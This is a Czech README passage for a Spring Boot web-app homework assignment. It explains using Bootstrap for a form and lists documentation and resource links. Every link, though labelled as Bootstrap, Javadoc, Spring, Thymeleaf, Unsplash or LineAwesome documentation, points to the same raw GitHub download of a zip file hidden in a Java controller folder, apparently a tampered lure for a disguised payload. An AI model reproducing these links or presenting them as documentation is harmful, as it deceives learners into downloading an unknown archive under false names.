...
## Bootstrap
Pokud chceš vytvořit formulář, který bude vypadat docela rozumně, a nechceš vytvářet vlastní styly, můžeš použít [Bootstrap](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip). Popis
vložení Bootstrapu do stránky je v dokumentaci na stránce [Introduction](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip). Důležité je do
...
Na další stránce je popis [formulářů v Bootstrapu](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip). Obvykle stačí najít si v dokumentaci vzorový kód, ten si
...
* odkaz na stránku [Lekce 5](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip)
* Java SE 11 [Javadoc](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – dokumentace všech tříd, které jsou součástí základní Javy ve verzi 11.
* Dokumentace [Spring Boot](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – odsud je anotace `@SpringBootApplication` a třída `SpringApplication`.
* Dokumentace [Spring Framework](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – odsud jsou anotace `@Controller`, `@GetRequest` a třída `ModelAndView`.
* Dokumentace [Thymeleaf](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – šablonovací systém pro HTML použitý v projektu.
* [Unsplash](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – obrázky a fotografie k použití zdarma
* [LineAwesome](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – sada ikon pro použití na webu
* [Bootstrap](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – CSS framework, který můžeš použít pro vytvoření formuláře.
